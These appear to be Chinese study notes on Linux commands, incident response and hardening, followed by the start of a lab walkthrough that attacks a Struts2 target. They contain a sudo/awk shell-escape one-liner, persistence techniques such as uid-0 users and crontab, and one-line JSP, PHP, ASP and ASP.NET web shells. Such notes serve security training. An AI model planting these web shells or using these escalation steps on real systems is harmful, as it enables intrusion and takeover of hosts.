

# Linux 加固

## Day1 Linux命令

### 快捷键

| | |
|--|--|
|Tab|补全|
|shift+insert|粘贴|
|alt+insert|复制并粘贴|
|ctrl+A|光标移动到行首|
|ctrl+E|光标移动到行尾|
|ctrl+K|清除光标后至行尾的内容|
|ctrl+U|清除光标前至行首间的所有内容|

<table>
	<tr><th align="center" colspan="2">通配符</th></tr>
	<tr><td>*</td><td>匹配任意字符</td></tr>
	<tr><td>?</td><td>匹配单个字符</td></tr>
	<tr><td>[]</td><td>匹配括号里面任意一个，比如[0-9][a-z] </td></tr>
	<tr><td>{}</td><td>匹配多个 ll {*.log,*.txt} </td></tr>
	<tr><td>^</td><td>取反 ll *[^.txt]</td></tr>
</table>

### 命令

````shell
history #查看历史输入
cat ~/.bash_history #CentOS历史命令文件
cat ~/.zsh_history #Ubuntu历史命令文件
#查找文件和目录
find / -name "a*"
find . -name "*.txt" -exec rm -rf {} \;
find . -name aaa -exec mv {} bbb \;
whereis #查找二进制程序、代码等相关文件路径
which #查找并显示给定命令的绝对路径
locate #updatedb程序每天会跑一次，建立文件索引
#查看文件内容
less 
#enter 下一行
#space/Ctrl+F 向下滚动一屏
#b 往回翻一屏
#/ 向后查找内容 
#? 向前查找内容
#n 下一个
#N 上一个
tail -f a.log #查看文件尾部内容
wc * #统计文件行数-l，单词数，字母数
ll | wc -l #统计文件个数
chown -R redis:redis /usr/local/soft/redis #改变文件或目录的属主和属组
````

```shell
#编辑vi/vim
vi
###########################################
-命令模式
dd删除一行
Ctrl+F 前进一屏（Forward）
Ctrl+B 后退一屏（Backspace）
Shift+G 跳到文档结尾
gg 跳到文档开头
/ 向后查找内容
? 向前查找内容
n下一个
N上一个
###########################################
-插入模式/编辑模式
Ctrl+U 撤消 
###########################################
-底行模式
:l 回到第一行
:set nu 显示行号
```
## Day2 Linux应急响应

### 事前流程

#### 数据备份

#### 风险评估

#### 安全巡检

#### 应急演练

#### 防范措施

#### 安全培训



### 事后流程

#### 信息收集

##### 基础信息

##### 影响范围

#### 类型判断

##### 何种安全事件

#### 原因分析

##### 如何入侵的

#### 事后处理

##### 进程、文件、网络、补丁等

隔离主机 阻断通信 iptables -A OUTPUT -d x.x.x.x -j DROP


#### 编写报告

### Linux攻击方式

#### 扫描端口信息：

#### 暴力破解：

ssh 22端口 ；工具：hydra medusa python

#### 漏洞利用：

Linux内核；
java python TP  log4j 
容器：tomcat jboss weblogic Spring
CMS：通达OA 悟空CMS dedeCMS wordpress

#### 提权

sudo 提权
修改 /etc/sudoers.d 文件
sudo awk 'begin{system("/bin/bash")}'

应用UDF IIS FTP

SUID提权

#### 权限维持

上传木马

隐藏用户
创建uid，gid为0的用户

端口复用 进程注入

定时任务 crontab

自启动
checkconfig

SSH Key免密登录

#### 痕迹清理

登录信息 history 日志
/var/log 目录
btmp文件
`# lastb` 查看登陆失败信息
secure文件 

CPU`ps -aux --sort=-pcpu | head -10`

内存`free -m`

网络`netstat -antpl`

## Day3 Linux安全加固

### 身份鉴别

#### 删除多余用户

查看`/etc/passwd`文件

命令`userdel`

#### 口令安全策略

**空口令检查** `awk -F: '($2 == ""){print $1}' /etc/shadow`

**口令有效期** `/etc/login.defs`

设置

```
PASS_MAX_DAYS
PASS_MIN_DAYS
PASS_MIN_LEN
```

**口令复杂度** 

```
/etc/pam.d/system-auth
/etc/pam.d/password-auth
```

密码生成：`pwmake 100`

**登录失败策略** `/etc/pam.d/sshd`

```
deny #错误次数
unlock_time #解锁时间
```
### 访问控制

#### sudo和SUID权限


#### 禁止root用户远程登录

/etc/ssh/sshd_config

```
PermitRootLogin no
systemctl restart sshd
```
#### 禁止su非法提权

只允许root和wheel组用户su到root

`/etc/pam.d/su`

```
auth sufficient /lib/security/pam_rootok.so
auth required /lib/security/pam_wheel.so
group=wheel
```
### 安全审计

#### 审计服务

```
systemctl start auditd
systemctl start rsyslog
systemctl enable auditd
systemctl enable rsyslog
```
### 资源控制

#### IP是否允许访问

黑名单 `/etc/hosts.deny`

白名单 `/etc/hosts.allow`
#### 会话超时锁定

会话超时锁定 `/etc/profile`

### 入侵防范


### 补丁和更新


### 安全产品

监控、告警
防火墙 (firewall) TCP
WAF (web application firewall) HTTP
堡垒机（运维审计系统）
IPS 入侵防御系统
IDS 入侵检测系统
态势感知
主机杀毒
安全管理平台（SCO）
抗DDos
VPN
终端安全管理系统EDR
漏洞扫描
蜜罐
CheckList与检测脚本
防火墙或安全组 systemctl enable firewalld.service
https://venustech.download.venuscloud.cn/
https://bbs.sangfor.com.cn/plugin.php?id=service:download
### CheckList与检测脚本


### 其他



# Day1

### 1. 靶场网络拓扑结构

![image-20221216105931811](assets/image-20221216105931811.png)
### 2. 网络配置

| 机器名称 | 网卡VMnet4      | 网卡VMnet3      | 账号密码               |
| :------- | :--------------- | :--------------- | :---------------------- |
| web      | 192.168.157.132 | 192.168.183.133 | ubuntu:ubuntu          |
| 域成员   | 无              | 192.168.183.128 | douser:Dotest123       |
| 域控     | 无              | 192.168.183.130 | administrator:Test2008 |
| Kali     | 随机            | 无              | kali:kali              |

**VMware网络适配器配置**

VMnet3：

![image-20221215202829602](assets/image-20221215202829602.png)

VMnet4：

![image-20221215202842404](assets/image-20221215202842404.png)

### 3. WEB机器安装及配置

1. 安装进虚拟机

2. 配置网络，设置IPv4

   设置ubuntu网络适配器

   ![image-20221216111256936](assets/image-20221216111256936.png)

   ![image-20221216111324060](assets/image-20221216111324060.png)

   点击`Edit Connections`

   ![image-20221216111053941](assets/image-20221216111053941.png)

   设置网卡1和网卡2的IP

   ![image-20221216111150214](assets/image-20221216111150214.png)

   ![image-20221216111507142](assets/image-20221216111507142.png)

   ![image-20221216111554986](assets/image-20221216111554986.png)

3. 启动Docker

   ```
   # 启动，报错正常
   sudo docker start ec 17 09 bb da 3d ab ad
   # 查看docker进程
   sudo docker ps
   ```

   ![image-20221216112041866](assets/image-20221216112041866.png)

### 4. 开始攻击

#### 1. 信息收集-端口

**nmap扫描端口**

![image-20221216112440239](assets/image-20221216112440239.png)

发现22、2001、2002、2003端口

#### 2. 访问2001端口

http://192.168.157.132:2001/

**查看源码发现struct2**

jsp一句话木马

无回显

```
<%Runtime.getRuntime().exec(request.getParameter("p"));%>
```

```text
PHP:    
<?php @eval($_POST['chopper']);?>
ASP:    
<%eval request("chopper")%>
ASP.NET:    
<%@ Page Language="Jscript"%><%eval(Request.Item["z"],"unsafe");%>
```

#### 3. 访问2002端口

#### 4. 访问2003端口